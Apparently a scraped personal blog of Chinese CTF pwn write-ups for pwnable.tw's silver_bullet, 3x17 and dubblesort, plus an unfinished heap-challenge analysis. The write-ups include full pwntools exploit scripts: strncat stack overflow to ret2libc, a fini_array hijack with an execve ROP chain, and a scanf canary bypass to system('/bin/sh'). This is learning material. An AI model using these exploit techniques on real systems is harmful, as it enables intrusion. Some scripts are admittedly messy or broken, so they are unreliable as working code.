12));//可以输入的size是很粗暴的48 - 当前sizestrncat(bullet_list, s, 48 - *(bullet_list + 12));//然后将新输入的s追加到list后，new_num = strlen(s) + *(bullet_list + 12);//并重新计算子弹数量printf(&quot;Your new power is : %u\\n&quot;, new_num);//输出*(bullet_list + 12) = new_num;//保存return puts(&quot;Enjoy it !&quot;); ​ 在乱输入的时候发现了诡异的bug， ​ ​ 先留着，看看最后一个功能。 beat1234567891011puts(&quot;&gt;----------- Werewolf -----------&lt;&quot;); printf(&quot; + NAME : %s\\n&quot;, *(a2 + 4));//gin printf(&quot; + HP : %d\\n&quot;, *a2);//7fff ffff puts(&quot;&gt;--------------------------------&lt;&quot;); puts(&quot;Try to beat it .....&quot;); *a2 -= *(bullet_list + 48); //hp = hp - size if ( *a2 &lt;= 0 )//hp等于0就赢了，但是赢了有啥用 &#123; puts(&quot;Oh ! You win !!&quot;); return 1; &#125; ​ 这里也没啥好说的，我们就是希望子弹的数量大于7fff ffff，比如说-1，或者嗯大于这个数。但是事实上比起如何让数量达到条件，我更关心的是这样费力赢了有啥用捏。赢也没有给我们任何后门或者金手指,再不济来个leak吧（（ 利用思路​ 逆完了，但是并没有清晰的思路，只有很多疑点。 打赢狼人的意义何在 powerup是否存在整数溢出，是否存在内存泄露 ​ 首先第一个问题可以看到，唯一的区别就是win之后返回的是1，也就是main retrun 0 。恕我无能，我觉得没有区别，要硬说区别,我觉得是如果不赢就不能覆盖返回地址劫持执行流？ ​ 第二个，我觉得这个题的突破点就在此。可以动调测试一下。 ​ 现在数量是0x28，也就是40，但是当我们power up 一个8size的description。 ​ ​ 非常神奇的事情就发生了。 ​ 我初步猜测是这个strncat的时候把空字节覆盖到了size上，然后因为new num的添加在函数的最后，所以我看到的就是我最后输入的power up的值。 ​ 确实是这样。这是刚刚strncat后，stack的样子。 ​ 这样思路就清晰了，我们的num被刷新成了一个较小的size，而power up并不是在原来的buf上覆盖数据，而是追加新的字符串，这样就能够进行覆盖。然后直接栈溢出，快乐rop。 ​ 写到这里大概用了一个小时，思路基本没有卡过，其实不算很慢。因为写其实用了很久，但是比较矛盾，如果我只看不写可能思路不是非常清晰。还有就是其实这里之所以思路比较连贯主要是我那个乱输发现的bug给我提供了一个定向的思考方向，但是如果没有发现这个问题呢？以我的眼力看出那个strncat的概率又有多大呢？ ​ 一方面是眼里还是不够好，另一方面如果其实“乱输”不失为一种解题的方式，只是像我这样随机地，人为地乱输成功率确实难以保障，所以也许我们需要一套比较完整的体系来fuzz出任意简单题的bug点。所以这也是我对于fuzz比较感兴趣的原因，然而这种简单的洞fuzz还是太小题答做了。 利用​ 通过刚才的分析，其实题目利用的思路已经非常清楚了，就是首先create子弹的时候填为47，power up时增加一颗子弹，使得子弹的数量被刷新为1。接着就可以在bulllet + 0x48之后的地址覆盖数据，实现栈溢出。 ​ 稍微测试一下。 ​ 然后问题就是这里应该是ret2libc，而不是ret2syscall。gadget好像不是很多，那就libc试一下。 ​ 大概程序流劫持已经没有问题了,这里确实印证了我的猜想，只有当赢的时候才能返回，所以需要覆盖num大于7fffffff，但是需要注意的是如果无脑把num覆盖为ffffffff的话会导致num判断已经大于48，以至于无法输入后面的内容。 1234567create_bullet(b&quot;a&quot;*47)power_up(b&quot;a&quot;)payload = b&quot;\\xff&quot;*3 + p32(addr) * 5power_up(payload)beat()#power_up(p64(0x200)+ p64(0) + p64(addr))gdb.attach(p) ​ 不管了，随便溢了。就是普通的ret2libc，能够leak system，然后第二次劫持执行流跳转到system，或者onegadget上。 ​ 这里地址如此诡异主要是加载了程序给我的libc。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768from pwn import*#from LibcSearcher import LibcSearchercontext.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process([&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;,&quot;./silver_bullet&quot;],env=&#123;&quot;LD_PRELOAD&quot; : &quot;./libc_32.so.6&quot;&#125;)elf = ELF(&quot;./silver_bullet&quot;)#p = remote(&quot;chall.pwnable.tw&quot;,10107)libc = ELF(&#x27;./libc_32.so.6&#x27;) puts_plt = elf.plt[&#x27;puts&#x27;]libc_start_main_got = elf.got[&#x27;__libc_start_main&#x27;]main = elf.symbols[&#x27;main&#x27;]addr = 0x80488C1def create_bullet(data): p.recvuntil(&quot;Your choice :&quot;) p.sendline(&#x27;1&#x27;) p.recvuntil(&quot;Give me your description of bullet :&quot;) p.send(data) p.recvuntil(&quot;Your power is :&quot;)def power_up(data): p.recvuntil(&quot;Your choice :&quot;) p.sendline(&#x27;2&#x27;) p.recvuntil(&quot;bullet :&quot;) p.send(data) p.recvuntil(&quot;power is :&quot;)def beat(): p.recvuntil(&quot;Your choice :&quot;) p.sendline(&#x27;3&#x27;) p.recv() create_bullet(b&quot;a&quot;*47)power_up(b&quot;a&quot;)rop = p32(puts_plt)rop += p32(addr)rop += p32(libc_start_main_got)payload = b&quot;\\xff&quot;*3 + b&#x27;a&#x27;*4 + roppower_up(payload)beat()p.recvuntil(&quot;You win !!&quot;)libc_start_main_addr = u32(p.recv()[1:5])log.success(&quot;libc_start_main_addr =&gt; &#123;&#125;&quot;.format(hex(libc_start_main_addr)))libc_base = libc_start_main_addr - libc.symbols[&#x27;__libc_start_main&#x27;]system_addr = libc_base + libc.symbols[&#x27;system&#x27;]#binsh_addr = libcbase + libc.symbols[&#x27;str_bin_sh&#x27;]log.success(&quot;system_addr =&gt; &#123;&#125;&quot;.format(hex(system_addr)))#log.success(&quot;binsh_addr =&gt; &#123;&#125;&quot;.format(hex(binsh_addr)))log.success(&quot;libc_base =&gt; &#123;&#125;&quot;.format(hex(libc_base)))one_gadget = libc_base + 0x3a81#0x5f065#0x5f066create_bullet(b&quot;a&quot;*47)power_up(b&quot;a&quot;)payload = b&quot;\\xff&quot;*3 + b&#x27;a&#x27;*4 + p32(one_gadget)power_up(payload)beat()gdb.attach(p)p.interactive() ​ 这个环境好像有问题。 一点简单的感想​ 这个题我现在只觉得非常简单。但是就算是这样的简单题做了两个小时，逆向花了一些时间，但是明明题目逻辑非常简单。我是废物。我觉得这种题应该是可以秒的。","categories":[{"name":"STACK - Other","slug":"STACK-Other","permalink":"https://fuurinko.github.io/categories/STACK-Other/"}],"tags":[{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"}]},{"title":"pwnable - 3x17","slug":"week9_3.1_3x17","date":"2022-04-27T03:44:23.414Z","updated":"2022-04-28T14:24:19.483Z","comments":true,"path":"2022/04/27/week9_3.1_3x17/","link":"","permalink":"https://fuurinko.github.io/2022/04/27/week9_3.1_3x17/","excerpt":"","text":"overview ​ 轻松快乐的栈题，没有canary和pie那估计就是rop力。 ​ 怪耶。 ​ 居然是静态链接捏，那就不是ret2libc力。 Reverse​ 开幕雷击 ​ 这是啥？ ​ 秉持着看不懂就假装没有看到的原则，先看看得懂的地方。 12345678910result = ++::result;if ( ::result == 1 )&#123; my_write(1u, &quot;addr:&quot;, 5uLL); my_scanf(0, buf, 0x18uLL); addr = mem_set(buf);//不知道这是个什么函数，暂且叫做mem set。 my_write(1u, &quot;data:&quot;, 5uLL); my_scanf(0, addr, 0x18uLL); result = 0LL;&#125; ​ 可以看到程序提供了一个任意地址写。一次最多写24字节，并且正常情况下只能写一次。所以其实其他的那些恶心的伪代码暂时可以忽略掉了，这里一个任意地址写就已经足够了。 ​ 突然意识到其实这个就是main函数，因为之前那个调用了非常多参数的函数其实是start函数。一般来说题目都会提供符号表，所以以前做题就直接点进main函数从而忽略start函数的其他参数了，以至于这里去除掉符号表后一下没有反应过来，看完了逻辑才后知后觉这里就是main函数。 ​ ps：对于没有符号表的动态链接程序，需要判断函数我一般是直接动调对比，但是如果是静态链接的话似乎也没有什么用，这里学到一种新的方式，就是利用flirt功能，但是十分可惜先进的ida7.7并没有安装这个插件。关于flirt，可以看看这个https://hex-rays.com/products/ida/tech/flirt/in_depth/。这篇guide？从flirt的构思到实现，非常细致地向我们介绍了flirt这个功能，感觉都可以拿去参加技术分享演讲了，反正我是抱着好玩的心思看完了，当阅读练习了，话说如果是母语的话这个体量认真看并理解也就是十分钟吧。但是English要看二十多分钟捏。 ​ 12A signature file contains patterns of standard runtime functions. With their help, IDA is able to recognize the standard functions and names them accordingly. ​ 如果有了sig文件，ida就能识别每个函数的名字。 还是杂乱无章的做题笔记​ 想到哪写哪捏。 ​ 任意地址写，很多时候想到的都是覆盖got表或者hook，栈题hook用得比较少，那就可以覆盖got，再不济可以覆盖栈中的返回地址为后门地址。 ​ 跳转getshell的部分其实比较简单，但是如何leak后门地址呢？并且这里任意地址地址写应该只能利用一次。一次只能写0x18个字节，很显然仅靠这一次任意地址写我们啥都做不了。 ​ 但是感觉也没有特别好的方法能够多次写入，于是到这里就没有思路了。 ​ 所以我去看了wp，又学到了新知识。 ​ ps:我在看wp的时候发现有个师傅废话比我还多，有一点欣慰（bushi ​ 太长不看：在64位静态链接的程序下，libc_csu_fini会将程序接下来需要指行的函数保存在.fini.array数组，并且是逆序执行，比如先执行.fini.array[1],再执行.fini.array[0]，这个.fini.array数组的地址是写可以比较容易获得并且可写的，所以如果我们能覆盖这个数组，就能够进行程序执行流劫持，甚至栈迁移。 ​ 唔，这道题确实学到很多新知识，之前其实也有了解过main函数执行之前的一些操作，但是都是没有针对性地笼统了解，现在题目摆在我面前，不去深入了解就没有办法理解题目捏。 ​ 所以这里参考了详解64位静态编译程序的fini_array劫持及ROP攻击 ​ 反观我们开始的start函数。 1sub_401EB0(main, v4, &amp;retaddr, csu_init, csu_fini, a3, &amp;v5); ​ 大概就是这样。 ​ 然后看csu fini ​ 这里比较关键的操作就是将.fini_array的地址保存在rbp中，然后在后面调用了.fini_array内保存的函数。 ​ 可以利用elfheader直接查看 ​ 可以看到确实0f0-100的范围内出现了两个函数指针。 ​ ​ 然后这里就是一个很逆天的操作，如果我们把 .fini_array[1]覆盖成某个我们想要跳转执行的函数A。然后.fini_array[0]覆盖为libc_csu_fini的地址，那么就会出现这样一种情况。 ​ 当main函数第一次执行完，返回到start，调用libc_csu_fini，这个函数会执行.fini_array[1]，也就是我们刚刚覆盖的函数A。等待函数A执行完毕之后，返回到libc_csu_fini，然后继续调用.fini_array[0]，也就是libc_csu_fini。而这个函数又重新执行函数A，返回，再执行自己，以此周而复始，可以说如果.fini_array[0]一直是libc_csu_fini的地址，那么这个循环就会一直进行下去。 ​ 所以只要我们把.fini_array[0]覆盖为libc_csu_fini的地址，并且把.fini_array[1]覆盖可以任意地址写的地址，就可以无限写入数据了，我们就正好可以写rop链。 ​ 这个操作完成之后，就只需要考虑在哪里写入rop链了。我们要同时满足地址可写并且可执行，还需要劫持执行流到写入rop的地方，这里看起来非常简单，因为我们有一个非常无敌的任意地址写，但是实际上如果我们随便找某一个可写的地址写入rop链的话，栈指针将完全不能利用，rop也是无稽之谈，所以我们必须进行栈迁移，将栈劫持到写入rop的地方。 ​ 关于如何利用libc_csu_fini实现栈迁移，其实也是有一定可讲的地方。 ​ 还是回到这一串汇编，这里fini为了调用fini array，将fini array的值保存在rbp中，因此我们可以通过控制fini array从而控制rbp，再借用leave ret一类的gadget进行栈迁移。 ​ 这里就站在巨人的肩膀上，直接借用wp中的思路，将rop链写在array + 0x10上，然后劫持到fini上，就能直接执行rop链。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import*context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process(&quot;./3x17&quot;)#p = remote(&quot;111.200.241.244&quot;,62729)fini_addr = 0x4B40F0main_addr = 0x401B6D start_addr = 0x4B4100libc_csu_fini = 0x402960#------rop-gadget-------leave_ret = 0x401C4Bpop_eax = 0x41e4afpop_edi = 0x401696pop_esi = 0x406c30pop_edx = 0x446e35syscall_addr = 0x471db5binsh_addr = 0x4B4600sys_read_addr = 0x446E2Crop_addr = 0x4b4100 #fini array + 0x10def write_addr(addr,data): p.recvuntil(&quot;addr:&quot;) p.send((sre(addr))) p.recvuntil(&quot;data:&quot;) p.send(data)#hajick the fini array to loop the write operationwrite_addr(fini_addr,libc_csu_fini)write_addr(fini_addr + 0x8,main_addr)#write rop chain in the fini + 0x10 write(bin_sh_addr,&quot;/bin/sh\\x00&quot;)write(rop_addr,p64(rop_pop_rax))write(rop_addr+8,p64(0x3b))write(rop_addr+16,p64(rop_pop_rdi))write(rop_addr+24,p64(bin_sh_addr))write(rop_addr+32,p64(rop_pop_rdx))write(rop_addr+40,p64(0))write(rop_addr+48,p64(rop_pop_rsi))write(rop_addr+56,p64(0))write(rop_addr+64,p64(rop_syscall))write(fini_array,p64(leave_ret)) # overwrite the fini[0] to leave_ret addr to pivot the stack.when execute the leave ,rsp = rbp = fini array[0],then pop rbp,so the rsp is fini array[1],finally,ret with rip = rsp = fini array[2] = rop.p.interactive() ​ 如果在write函数中不加p.recv()，interactive的时候就会被疯狂轰炸以至于拿不到flag。 ​ 不加recv大概是这样。 ​ ​ 加上recv的话有时候会打不来，有时又可以。总之就是这个环境非常的离奇，如果本地打得通远端打不通建议多试几次。","categories":[{"name":"STACK - Other","slug":"STACK-Other","permalink":"https://fuurinko.github.io/categories/STACK-Other/"}],"tags":[{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"}]},{"title":"pwnable - doubblesort","slug":"week8_7.1_dubblesort","date":"2022-04-24T07:07:29.428Z","updated":"2022-04-27T03:44:04.949Z","comments":true,"path":"2022/04/24/week8_7.1_dubblesort/","link":"","permalink":"https://fuurinko.github.io/2022/04/24/week8_7.1_dubblesort/","excerpt":"","text":"overview ​ 逆向​ 又是排序。但是这个是个纯纯的栈题，并且保护全开，那就是不能rop，估计又是要逆清然后找漏洞捏。照我之前做的那个快排的经验，排序本身应该没有漏洞，漏洞出在num地址的溢出。 main12345678910111213141516171819202122232425262728293031323334353637383940414243int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned int sort_num; // eax _BYTE *num_order; // edi unsigned int i; // esi unsigned int j; // esi int result; // eax unsigned int num; // [esp+18h] [ebp-74h] BYREF _BYTE v9[32]; // [esp+1Ch] [ebp-70h] BYREF char buf[64]; // [esp+3Ch] [ebp-50h] BYREF unsigned int v11; // [esp+7Ch] [ebp-10h] v11 = __readgsdword(0x14u); init(); // init print(1, &quot;What your name :&quot;); read(0, buf, 0x40u); // buf =&gt; 64 byte , NO OVERFLOW print(1, &quot;Hello %s,How many numbers do you what to sort :&quot;); __isoc99_scanf(&quot;%u&quot;, &amp;num); // uint sort_num = num; if ( num ) &#123; num_order = v9; for ( i = 0; i &lt; num; ++i ) &#123; print(1, &quot;Enter the %d number : &quot;); fflush(stdout); __isoc99_scanf(&quot;%u&quot;, num_order); sort_num = num; num_order += 4; &#125; &#125; sort(v9, sort_num); // sort puts(&quot;Result :&quot;); if ( num ) &#123; for ( j = 0; j &lt; num; ++j ) print(1, &quot;%u &quot;); &#125; result = 0; if ( __readgsdword(0x14u) != v11 ) sub_BA0(); // smash return result;&#125; ​ 这里是比较奇怪的就是程序记录num的次序是在栈上定义的一个指针，然后将对应的num输入到指针指向的地方，所以如果我们能够劫持这个指针或许就找到了突破口。 ​ 这里有一个看起来有一些奇怪的逻辑，每一次输入num，num_order 加4，也就是对应两个uint长度，似乎也没有什么用. ​ 但是找不到劫持的方法，sort的步骤看起来合情合理，并没有什么明显的漏洞。 sort1234567891011121314151617181920212223242526272829303132333435363738394041424344unsigned int __cdecl sub_931(unsigned int *a1, int num)&#123; int last_num; // ecx int i; // edi unsigned int v4; // edx unsigned int v5; // esi unsigned int *v6; // eax unsigned int result; // eax unsigned int v8; // [esp+1Ch] [ebp-20h] v8 = __readgsdword(0x14u); puts(&quot;Processing......&quot;); sleep(1u); if ( num != 1 ) &#123; last_num = num - 2; for ( i = (int)&amp;a1[num - 1]; ; i -= 4 ) &#123; if ( last_num != -1 ) &#123; v6 = a1; do &#123; v4 = *v6; v5 = v6[1]; if ( *v6 &gt; v5 ) &#123; *v6 = v5; v6[1] = v4; &#125; ++v6; &#125; while ( (unsigned int *)i != v6 ); if ( !last_num ) break; &#125; --last_num; &#125; &#125; result = __readgsdword(0x14u) ^ v8; if ( result ) sub_BA0(); return result;&#125; ​ 基本所有关键的变量都是uint。怪，我记得之前sort里面是有一个强制类型转换的。。。。 利用一些很乱的做题笔记 ​ 这个题的栈还算清楚，至少找得到东西，没有乱七八糟。可以比较直观地看出d60c开始存着我们的name，然后是八个字节的空字节，这样就基本没有任何通过name leak的可能性了，但是问题不大。 ​ ​ 进入sort之前，参数在栈中的状态。那么如果溢出最后一个num为一个很大的数会怎样呢。笑死，溢出不了捏。 ​ ​ 然后进行sort，把参数按照规则交换以后pop到合适的位置。 ​ 此外，如果我们在输入name的时候随便输入一些东西，比如1，其实除了1还会打印出一些很奇怪的东西， ​ 我们查看name储存的栈内存，发现确实是有东西的，但是这个值是随机的，但最低位是\\x00，所以只要我们输入一个字节的name就不会影响。 ​ ​ 这个值是完全随机的，并且末尾是空字节，按照第六感，我就基本上把它看作是canary了。所以通过这一步我们获得了main栈帧的canary。（也许 123456p.recvuntil(&quot;What your name :&quot;)p.sendline(b&#x27;1&#x27;)p.recvuntil(&quot;Hello&quot;)data = p.recv()[1:5]main_canary = u32(data.ljust(4,b&#x27;\\x00&#x27;)) - 0x31log.success(&quot;main_canary =&gt; &#123;&#125;&quot;.format(hex(main_canary))) ​ 说点有的没的，识别canary并无坑获取这一点虽然非常简单，但是我真的很熟练，可能是我这么熟练，pwncollege要负全责，他那个stack overflow的modlue真的非常之折磨，而我居然全部做完了（ ​ 获得canary就比较快乐，但是程序并没有给我们直接的溢出的机会，然而输入num的地址是一个空间有限的数组，所以我们可能可以通过输入比较多的数字来覆盖num 地址之后的指针。 看样子可行，d61c原本是一个指针，但是现在它是1了。那么现在需要搞清楚这些可以被覆盖的指针分别指向什么，以及覆盖以后如何利用。 ​ 输入十个数，栈中情况： ​ 输入十五个数，栈中情况： ​ ​ 粗浅看了一下，感觉并没有特别好的思路，指针确实是被覆盖了，但是如何利用呢？ ​ 可以被覆盖的指针大致指向这些东西，似乎也没有很好的利用方式。呜呜。 ​ 大意了。昨天做pic adc，脑子都麻了没有想到可以直接覆盖空字节来leak栈地址，今天一筹莫展的时候在想为什么程序只给我们一个莫名其妙的canary啊，也没有栈溢出啥的，然后就突然意识到是我脑残了，其实这里就是一个栈的leak，把canary的空字节覆盖掉就好了（ ​ 话说这里覆盖掉canary为什么不会smash。 ​ 观察一下就可以看到我们能够leak 空字节前的所有地址，再观察一下可以发现这些地址不仅是栈上的，还有libc上的，这样就相当于可以leak stack和libc了。 123456789101112131415# leak stack and libcp.recvuntil(&quot;What your name :&quot;)p.send(b&#x27;aaaaaaaa&#x27;)p.recvuntil(&quot;aaaaaaaa&quot;)data = p.recv()[4:12]log.success(&quot;data =&gt; &#123;&#125;&quot;.format(data))stack_addr = u32(data[0:4])libc_addr = u32(data[4:8])libc_base = libc_addr - libc_offsetonegadget = libc_base + 0x4f3d5#0x4f432#0x10a41clog.success(&quot;stack_addr =&gt; &#123;&#125;&quot;.format(hex(stack_addr)))log.success(&quot;libc_base =&gt; &#123;&#125;&quot;.format(hex(libc_base))) ​ ​ 接下来不是完全没有思路，而是可以用的思路太多，混淆视听了。稍微理一下。 利用num溢出改变程序执行流,直接跳转到one_gadget。 劫持num指针，修改其为exit_hook或者什么got表的地址，然后在其中写入one_gadget。 ​ 在经过一些尝试之后，确实是可以劫持程序执行流，但是中途会有canary，而我们之前leak canary的方式并不能同时leak libc和stack，所以到这里就没有思路了。 ​ 去看了wp，学到一个比较奇特的思路。 ​ 就是说我们是通过num的值来覆盖指针，在覆盖返回地址前会遇到canary，而我们的输入函数是利用scanf()，这个函数可以读取非法字符，但是不会将其写在栈上，所以如果我们在canary对应的位置覆盖为非法字符，就能跳过canary，从而实现栈溢出。 ​ 所以再次观察栈。 ebp的地址是0xffffd668，换算成输入的num就是 （（66c - 5ec )/4 ）+ 1 = 33 ​ canary 在d4c，也就是第25个数。 ​ 所以只需要输入前24个书为1，然后第二十五个数为非法字符。后面全部覆盖成地址就行。 ​ 可以看到这里其实已经跳转到one gadget了，但是有点问题，试一下system。 ​ ​ exp有一些混乱。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768+from pwn import *from LibcSearcher import LibcSearcher#libc = ELF(&quot;./libc_32.so.6&quot;)libc = ELF(&quot;/lib32/libc-2.27.so&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process(&#x27;./dubblesort&#x27;)elf = ELF(&#x27;./dubblesort&#x27;)libc_offset = 0x6808def input_num(num): p.recvuntil(&quot;number :&quot;) p.sendline(str(num))# leak stack and libcp.recvuntil(&quot;What your name :&quot;)p.send(b&#x27;aaaaaaaa&#x27;)p.recvuntil(&quot;aaaaaaaa&quot;)data = p.recv()[4:12]log.success(&quot;data =&gt; &#123;&#125;&quot;.format(data))stack_addr = u32(data[0:4])libc_addr = u32(data[4:8])libc_base = libc_addr - libc_offsetonegadget = libc_base + 0x3d1b3#0xf7ff61b3#0x3d1b9#0x3d1c0#0x67bdf#0x67be0#0x137dae #0x137dafsystem_addr = libc_base + libc.symbols[&quot;system&quot;]#bin_sh_addr = libc_base + libc.symbols[&quot;str_bin_sh&quot;]libc = LibcSearcher(&#x27;system&#x27;, system_addr)bin_sh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)log.success(&quot;stack_addr =&gt; &#123;&#125;&quot;.format(hex(stack_addr)))log.success(&quot;libc_base =&gt; &#123;&#125;&quot;.format(hex(libc_base)))log.success(&quot;system_addr =&gt; &#123;&#125;&quot;.format(hex(system_addr)))log.success(&quot;bin_sh_addr =&gt; &#123;&#125;&quot;.format(hex(bin_sh_addr)))#log.success(&quot;onegadget =&gt; &#123;&#125;&quot;.format(hex(onegadget)))#overflow to hijack the execute stream p.sendline(&#x27;35&#x27;)for i in range(24): input_num(1) p.recv()p.sendline(&#x27;+&#x27;)#25p.recv()for i in range(9): input_num(system_addr)#34 p.recv()p.sendline(str(bin_sh_addr))#35gdb.attach(p)p.interactive() ​ 这里libc的地址总感觉不对，每次都会跳到一个非常奇怪的地方，然后如果换成题目给的libc的话整个栈又完全变了，就很恼火。","categories":[{"name":"STACK - Other","slug":"STACK-Other","permalink":"https://fuurinko.github.io/categories/STACK-Other/"}],"tags":[{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"}]},{"title":"examination","slug":"heap_challenge_*ctf_2022_examination","date":"2022-04-16T07:37:48.671Z","updated":"2022-04-24T06:53:15.981Z","comments":true,"path":"2022/04/16/heap_challenge_*ctf_2022_examination/","link":"","permalink":"https://fuurinko.github.io/2022/04/16/heap_challenge_*ctf_2022_examination/","excerpt":"","text":"overivew ​ 其实把程序简化来看的话就是一道比较常规的chunk overlapping，漏洞很明显，但是又不完全明显，需要先认真把程序逆清楚。在pwn题的几个环节中，逆向确定漏洞点，分析漏洞寻找思路，写exp布置堆风水，调试扣细节，我觉得最头疼的可能就是逆向了，虽然过程也许不难，但是真的很bewilder。 ​ 其实这个程序看似非常复杂，菜单就写了十五分钟，但逆来逆去最关键居然的还是那个一眼uint溢出的漏洞，真的很难绷。利用它获得heap base和任意地址加1，于是比较自然的思路就是构造一个off by one进行chunk overlap。虽然但是当时花了大半天时间看musl pwn，没看出来，晚上还被拉出去看电影了，于是examination也懒得看了。主要是逆向逆得脑壳疼，程序没逆干净那个任意地址+1也没有利用的完整思路，晚上十点多坐在麦当劳写了会儿菜单就爬了，总共也没看超过一个小时，第二天起床发现学长通宵排堆结果失误了，确实没有绷住。这么会堆风水，以后职业算卦好了。 ​ ps:官方wp给出的方式是修改tcache管理结构体，这个方法有时间的话可以研究一下，但是这里就是用比较常规的思想走吧。 逆向switch结构修复​ ida7.7一打开就是正常识别的状态，但是7.7以下需要对switch结构进行修复。 ​ 第二个switch表修复后f5还是显示jmp rax，这时候连续多f5几次就行。 teacheradd student​ calloc 一个0x20size chunk1，一个0x18size chunk2，并将2的ptr写入1指向的空间。 bss段上定义一个结构体，第一个字段为chunk1 ptr，然后输入question的数量，并将数量存入chunk2，也就是**chunk1 ptr。 大致的字段如下： 123head[1] = chunk1_ptr*chunk1_ptr = chunk2_ptr*chunk2_ptr = num give scores​ 改卷，这个read暂时不管，然后生成学生的成绩。这时如果: 123456if ( *(_DWORD *)(head[i] + 24LL) == 1 )&#123; puts(&quot;the student is lazy! b@d!&quot;); v2 -= 10;&#125;*(_DWORD *)(*(_QWORD *)head[i] + 4LL) = v2; ​ v2是个uint，考虑可以溢出。 review​ 为学生添加一个review，然后在*(head[idx] + 8LL)创建comment chunk，将size保存在*(head[idx] + 16)。 call​ 类似free。只有三次机会。没有uaf。 never_pray12v0 = malloc(0x300uLL);read_str(0LL, v0, 768LL); 下辈子再逆吧。 思路​ 这个part只是寻找思路，不管堆风水啥的。 get reward​ 首先一眼uint溢出，鉴定为真。乱利用一下。 ​ 先看teacher module 的give score part。 ​ 如果要执行到lazy,需要满足一些条件。 1234567891011 buf[0] &amp;= 127u; score = buf[0] % (10 * chunk_list[i]-&gt;info_ptr-&gt;quesNum); printf(&quot;score for the %dth student is %d\\n&quot;, i, score); if ( LODWORD(chunk_list[i]-&gt;is_lazy_pray_union) == 1 ) &#123; puts(&quot;the student is lazy! b@d!&quot;); score -= 10; // overflow &#125; chunk_list[i]-&gt;info_ptr-&gt;score = score;&#125;puts(&quot;finish&quot;); ​ 首先确定score的值。 ​ 它的最初值来源于 1score = buf[0] % (10 * chunk_list[i]-&gt;info_ptr-&gt;quesNum);//？？？？？？？ ​ 而这个buf0来源于： 12345678for ( i = 0; i &lt; count; ++i ) &#123; if ( read(fd, buf, 8uLL) != 8 ) // fd is point to a random number &#123; puts(&quot;read_error&quot;); exit(-1); &#125; buf[0] &amp;= 0x7Fu; ​ 所以buf[0]就是一个只有7位的随机数，最大值为127。 ​ 这里有一个 is_lazy_pray_union,在stu module的pray part中被设置。只要stu第一次pray的话就会被设置为1。 ​ 所以大概一个这样的步骤就能稳定get reward。 123456789io.recvuntil(&#x27;role: &lt;0.teacher/1.student&gt;: &#x27;)io.sendline(&#x27;0&#x27;)add_student(1)change_role(1)pray()change_role(0)give_score()change_role(1)check() 任意地址加1？​ reward提供给我们了两个功能，一个是leak heap，一个是任意地址+1。正如前面所说的那样，我们能很自然地想到利用off by one 构造 chunk overlapping，条件的话确实都是齐全的。 ​ 并且虽然每一个student只能获得一次reward，但是我们能够申请很多个stu，并且程序提供给我们了change stu id功能，以至于每一个stu我们都能获得一次rewatd。 1234if ( HIDWORD(chunk_list[student_id]-&gt;is_lazy_pray_union) == 1 )// &#123; puts(&quot;already gained the reward!&quot;); &#125; ​ 但是overlapping哪个chunk呢？其实不难想，只是这个题申请的东西乱七八糟的，东西太多了混淆了视听，但是仔细理一下，虽然程序功能很多，但是能对chunk进行写有意义的操作的只有comment ，set mode 和 never pray again。 ​ 而never pray again看起来并不像是一个在过程中被溢出的chunk，而比较像是题目为我们刻意创造以修改exit_hook的。 ​ 而set mode 的size则为固定的0x20，反观comment size却是结构体中的字段，也确实可以+1。 ​ 所以我们可以大胆猜测，我们需要修改的就是comment chunk的size，那么沿着这个思路走下去，既然是单字节溢出，那么comment chunk的物理相邻堆块是什么？ ​ 伪代码看着头晕的话，就动调一下吧。 ​ ​ 可以比较清楚地看到comment chunk的下一个物理相邻的chunk是某个结构体chunk。我们则可以很轻易地将其prev_inuse位覆盖为0（这里控制好chunk size，不能以16字节对齐，从而使得当前chunk的最后八字节输入在下一个chunk的prev_size位上。） ​ 之前通过逆向我们可以知道程序分别为老师以及学生定义了一个结构体，而学生结构体的指针是保存在老师结构体中的。所以这里的可以被覆盖的chunk就是老师的结构体。也就是 伪代码中v2指向的chunk。 ​ 这样我们就已经有溢出的target chunk了。但是注意到libc版本是2.31。这样我们就没有办法伪造chunk prev size位，并改prev inuse位为0来造成overlapping，所以如果我们只能溢出几个字节的话，就只能关注与chunk的size位。 ​ 但是，但是。 ​ 这个任意地址+1确实太离谱了，尤其还是在comment size是储存在chunk上的，地址是绝对可控的，所以我们可以精确到位地将size在十位甚至百位上修改。这样就能造成比较简单的堆溢出，然后直接将下一个chunk全部覆盖掉成为fake chunk。 ​ leak​ 还是先考虑常规的unsorted bin leak，我们需要获得一个unsorted bin，再把它free后打印出来，考虑到程序没有uaf，我们需要想一些别的办法。 ​ target chunk肯定还是comment chunk，并且我们可以指定这个chunk size为unsorted bin chunk ，只是需要考虑怎么打印。 ​ 程序的打印就是只有stu module的review comment，既然是review comment，有一点似曾相识，就是利用别的chunk 来操作需要打印的chunk。 ​ 大概就是这么个逻辑，有uaf的unsorted bin leak就嗯打印，没有的话就需要借用别的一整个chunk的操作来打印这个chunk，所以这个题需要使得另外一个chunk的comment指针指向target chunk。 ​ 再看一下结构。 ​ d310保存该id对应的comment的size，其上一个字段则是指向comment也就是d308指向的内容，所以假设这个id是1，我们就可以完全控制student 2的chunk。 ​ 控制这个chunk首先比较简洁的方式是直接把comment chunk的size改成一个比较大的数，于是能直接打印出下一个comment chunk，而这个chunk 会在后面的步骤中被free，于是能够直接通过打印fd 和bk位从而leak libc。 ​ 所以基本的思路就是，add stu 0 comment，然后对应size的地址内容+1，将size改为一个较大的数，然后直接edit comment，溢出下一个stu 以及teacher 结构体chunk，伪造其储存的comment chunk的size，然后free 下一个chunk的comment（这个chunk应该为一个small chunk/large chunk），最后通过打印comment1直接leak 